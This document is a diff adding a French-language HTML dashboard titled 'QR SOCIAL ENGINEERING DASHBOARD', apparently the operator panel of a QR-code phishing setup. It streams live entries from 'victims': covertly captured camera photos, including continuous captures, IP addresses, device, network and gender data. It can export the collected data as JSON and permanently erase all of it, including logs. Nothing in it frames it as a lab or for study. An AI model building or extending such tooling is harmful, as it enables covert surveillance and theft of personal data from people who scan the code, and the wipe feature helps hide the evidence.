@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard - Données</title>
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box
+    }
+
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0a0a0a;
+      color: #0f0;
+      padding: 20px
+    }
+
+    .header {
+      background: #111;
+      border: 2px solid #0f0;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+      text-align: center
+    }
+
+    .header h1 {
+      color: red;
+      font-size: 28px;
+      text-shadow: 0 0 10px rgba(255, 0, 0, .5)
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 15px;
+      margin-bottom: 20px
+    }
+
+    .stat-box {
+      background: #111;
+      border: 1px solid #333;
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center
+    }
+
+    .stat-box .num {
+      font-size: 36px;
+      font-weight: bold;
+      color: red
+    }
+
+    .stat-box .lbl {
+      color: #888;
+      font-size: 12px;
+      text-transform: uppercase
+    }
+
+    .controls {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 20px
+    }
+
+    #live {
+      color: #0f0;
+      animation: blink 1s ease infinite;
+      font-size: 14px
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: .3
+      }
+    }
+
+    .controls button {
+      background: transparent;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: monospace
+    }
+
+    .controls button:hover {
+      background: #0f0;
+      color: #000
+    }
+
+    .btn-danger {
+      background: #dc2626 !important;
+      color: white !important;
+      border: 1px solid #dc2626 !important;
+      font-weight: bold !important
+    }
+
+    .btn-danger:hover {
+      background: #b91c1c !important
+    }
+
+    #data {
+      background: #111;
+      border: 1px solid #333;
+      border-radius: 10px;
+      padding: 20px;
+      max-height: 60vh;
+      overflow-y: auto
+    }
+
+    .entry {
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 8px;
+      background: #0d0d0d;
+      animation: slide .3s ease;
+      text-align: left;
+      font-size: 12px
+    }
+
+    @keyframes slide {
+      from {
+        opacity: 0;
+        transform: translateX(-20px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateX(0)
+      }
+    }
+
+    .time {
+      color: #f60;
+      font-size: 10px;
+      margin-bottom: 4px
+    }
+
+    .key {
+      color: #0f0
+    }
+
+    .val {
+      color: #fff
+    }
+
+    img.photo {
+      max-width: 150px;
+      border-radius: 5px;
+      margin-top: 5px;
+      border: 2px solid #0f0
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 2px 6px;
+      border-radius: 10px;
+      font-size: 10px;
+      margin: 2px
+    }
+
+    .bg-ip {
+      background: #606
+    }
+
+    .bg-photo {
+      background: #600
+    }
+
+    .bg-device {
+      background: #006
+    }
+
+    .bg-network {
+      background: #660
+    }
+
+    #stats-display {
+      color: #64748b;
+      font-size: 12px;
+      margin-left: 12px
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header">
+    <h1>🔴 QR SOCIAL ENGINEERING DASHBOARD</h1>
+    <div><span id="conn">🟢 Connecté</span></div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-box">
+      <div class="num" id="c-visits">0</div>
+      <div class="lbl">Victimes</div>
+    </div>
+    <div class="stat-box">
+      <div class="num" id="c-photos">0</div>
+      <div class="lbl">Photos</div>
+    </div>
+    <div class="stat-box">
+      <div class="num" id="c-ips">0</div>
+      <div class="lbl">Adresses IP</div>
+    </div>
+    <div class="stat-box">
+      <div class="num" id="c-devices">0</div>
+      <div class="lbl">Appareils</div>
+    </div>
+  </div>
+
+  <div class="controls">
+    <div>
+      <span id="live">● EN DIRECT</span>
+      <span id="stats-display"></span>
+    </div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+      <button onclick="exportData()">📥 Exporter JSON</button>
+      <button class="btn-danger" onclick="clearAllData()">🗑️ NETTOYER COMPLET</button>
+    </div>
+  </div>
+
+  <div id="data"></div>
+
+  <script>
+    const socket = io();
+    let counts = { visits: 0, photos: 0, ips: 0, devices: 0 };
+
+    socket.on('connect', () => document.getElementById('conn').textContent = '🟢 Connecté');
+    socket.on('disconnect', () => document.getElementById('conn').textContent = '🔴 Déconnecté');
+    socket.on('new-data', addEntry);
+
+    fetch('/api/data').then(r => r.json()).then(d => d.forEach(addEntry));
+    fetch('/api/stats').then(r => r.json()).then(s => {
+      document.getElementById('stats-display').textContent = `📁 ${s.photosOnDisk} fichiers | ${s.uploadSizeMB} Mo`;
+    });
+
+    function addEntry(data) {
+      const div = document.getElementById('data');
+      const e = document.createElement('div');
+      e.className = 'entry';
+      const t = data.timestamp ? new Date(data.timestamp).toLocaleTimeString('fr-FR') : '?';
+      let html = `<div class="time">🕐 ${t}</div>`;
+
+      // Afficher la photo si présente
+      if (data.photo) {
+        if (data.photo.startsWith('data:image')) {
+          html += `<img class="photo" src="${data.photo}"><br>`;
+          counts.photos++;
+        } else if (data.photo.startsWith('/uploads/')) {
+          html += `<img class="photo" src="${data.photo}"><br>`;
+          counts.photos++;
+        }
+      }
+
+      for (const [k, v] of Object.entries(data)) {
+        if (k === 'timestamp' || k === 'photo') continue;
+        if (typeof v === 'object') {
+          html += `<div><span class="key">${k}:</span></div><div style="background:#1a1a1a;padding:6px;border-radius:4px;font-size:11px;color:#ccc;margin-top:4px;overflow-x:auto;">${JSON.stringify(v, null, 2)}</div>`;
+        } else {
+          html += `<div><span class="key">${k}:</span> <span class="val">${v}</span></div>`;
+        }
+      }
+
+      if (data.gender) { html += `<span class="badge bg-device">👤 ${data.gender}</span>`; counts.visits++; }
+      if (data.ip) { html += `<span class="badge bg-ip">🌐 ${data.ip}</span>`; counts.ips++; }
+      if (data.effectiveType) { html += `<span class="badge bg-network">📶 ${data.effectiveType}</span>`; }
+      if (data.type === 'photo_continuous') { html += `<span class="badge bg-photo">📸 #${data.photoNumber}/${data.totalCaptures}</span>`; }
+
+      e.innerHTML = html;
+      div.insertBefore(e, div.firstChild);
+      while (div.children.length > 60) div.removeChild(div.lastChild);
+
+      document.getElementById('c-visits').textContent = counts.visits;
+      document.getElementById('c-photos').textContent = counts.photos;
+      document.getElementById('c-ips').textContent = counts.ips;
+      document.getElementById('c-devices').textContent = counts.devices;
+    }
+
+    function exportData() {
+      fetch('/api/data').then(r => r.json()).then(d => {
+        const blob = new Blob([JSON.stringify(d, null, 2)], { type: 'application/json' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `data_${Date.now()}.json`;
+        a.click();
+      });
+    }
+
+    // === NETTOYAGE COMPLET AVEC CONFIRMATION ===
+    function clearAllData() {
+      const modal = document.createElement('div');
+      modal.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:99999;font-family:"Courier New",monospace;';
+      modal.innerHTML = `
+    <div style="background:#111;border:2px solid #dc2626;border-radius:16px;padding:40px;max-width:450px;text-align:center;">
+      <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
+      <h2 style="color:#dc2626;margin-bottom:12px;">NETTOYAGE COMPLET</h2>
+      <p style="color:#94a3b8;margin-bottom:20px;">
+        Cette action va <strong style="color:#fff;">SUPPRIMER DÉFINITIVEMENT</strong> :<br>
+        • Toutes les données collectées<br>
+        • Toutes les photos (${counts.photos} fichiers)<br>
+        • Tous les logs<br><br>
+        <span style="color:#dc2626;">Action irréversible !</span>
+      </p>
+      <div style="display:flex;gap:12px;justify-content:center;">
+        <button onclick="this.closest('div[style]').parentElement.remove()" style="background:transparent;color:#94a3b8;border:1px solid #475569;padding:12px 24px;border-radius:8px;cursor:pointer;">Annuler</button>
+        <button onclick="executeCleanup(this)" style="background:#dc2626;color:white;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:bold;">✅ OUI, TOUT EFFACER</button>
+      </div>
+    </div>
+  `;
+      document.body.appendChild(modal);
+    }
+
+    function executeCleanup(btn) {
+      btn.textContent = '⏳ Suppression...';
+      btn.disabled = true;
+      fetch('/api/data', { method: 'DELETE' })
+        .then(r => r.json())
+        .then(() => {
+          document.getElementById('data').innerHTML = '';
+          counts = { visits: 0, photos: 0, ips: 0, devices: 0 };
+          ['c-visits', 'c-photos', 'c-ips', 'c-devices'].forEach(id => document.getElementById(id).textContent = '0');
+          btn.closest('div[style]').parentElement.remove();
+          showNotification('✅ Nettoyage terminé', '#10b981');
+          fetch('/api/stats').then(r => r.json()).then(s => { document.getElementById('stats-display').textContent = `📁 ${s.photosOnDisk} fichiers | ${s.uploadSizeMB} Mo`; });
+        })
+        .catch(err => { showNotification('❌ Erreur: ' + err.message, '#dc2626'); btn.closest('div[style]').parentElement.remove(); });
+    }
+
+    function showNotification(msg, color) {
+      const n = document.createElement('div');
+      n.style.cssText = `position:fixed;bottom:20px;right:20px;background:#111;border:2px solid ${color};color:${color};padding:16px 24px;border-radius:8px;z-index:99999;font-family:"Courier New",monospace;font-size:14px;font-weight:bold;animation:slide .3s ease;box-shadow:0 10px 30px rgba(0,0,0,0.5);`;
+      n.textContent = msg;
+      document.body.appendChild(n);
+      setTimeout(() => n.remove(), 3000);
+    }
+  </script>
+</body>
+
+</html>
